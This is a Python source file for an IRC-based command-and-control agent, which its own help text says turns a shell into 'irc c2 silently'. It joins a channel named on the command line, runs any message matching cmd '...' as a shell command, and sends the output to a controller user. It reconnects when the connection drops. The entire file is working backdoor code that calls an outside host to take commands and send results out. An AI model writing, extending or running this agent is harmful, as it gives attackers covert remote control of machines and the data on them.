import argparse
import socket
import os
import re
import subprocess
import time
import sys


def join_channel(channel):
    cmd = "JOIN"+" "+channel+"\r\n"
    ######print(cmd)#remove this lately
    ircsock.send(bytes(cmd,'UTF-8'))


def parseArgs(parser):
    parser.add_argument("-s","--server",dest="server",required=True, help="irc server to connect")
    parser.add_argument("-c","--channel",dest="channel",required=True,help="enter channel to join without #")
    parser.add_argument("-u","--username",dest="uname",required=True,help="enter username (name for your client on irc)")
    parser.add_argument("-a","--attacker",dest="target_user",required=True,help="name of target irc user on which you want to send commands")
    return parser.parse_args()



parser = argparse.ArgumentParser(description="a binary which converts you shell to irc c2 silently:) ")
args = parseArgs(parser) 
port = 6667
realname = args.uname
nickname = args.uname
channel = "#"+args.channel

def connect():
        global ircsock
        ircsock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server = socket.gethostbyname(args.server)
        ircsock.connect((server,port))
            
        try:
            ircsock.send(bytes(f"NICK {nickname}\r\n", "UTF-8"))
            ircsock.send(bytes(f"USER {nickname} 0 * :{realname}\r\n", "UTF-8"))
            join_channel(channel)
            print(f"channel {channel} joined successfully")
        except:
            print("something went wrong while joining channel")


def main():
    if os.name != 'posix':
        sys.exit(1)
    connect()
    try:
        while True:
            data = ircsock.recv(2048).decode()
            ######print(data)#remove this lately
            result = re.search(r'cmd ["\'](.*?)["\']', data)
            if result:
                cmd_text = result.group(1)
                #print(cmd_text)
                if cmd_text.lower() == 'quit':
                    break
                else:
                    process = subprocess.Popen(cmd_text, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    output, error = process.communicate()
                    if process.returncode == 0:
                        try:
                            ircsock.send(bytes("PRIVMSG " + args.target_user + " :" + "**********************************operation started**********************************" + "\n", "UTF-8"))
                            for line in output.splitlines():
                                ircsock.sendall(bytes("PRIVMSG " + args.target_user + " :" + line + "\n", "UTF-8"))
                                time.sleep(0.5)
                            ircsock.send(bytes("PRIVMSG " + args.target_user + " :" + "**********************************operation ended************************************" + "\n", "UTF-8"))
                        except Exception as e:
                            ircsock.close()
                            connect()
                    else:
                        ircsock.send(bytes("PRIVMSG " + args. target_user + " :" + "command not ran properly and you have lost connection" + "\n", "UTF-8"))
    except BrokenPipeError:
            ircsock.close()
            connect()                       

    

if __name__ == "__main__":
    main()


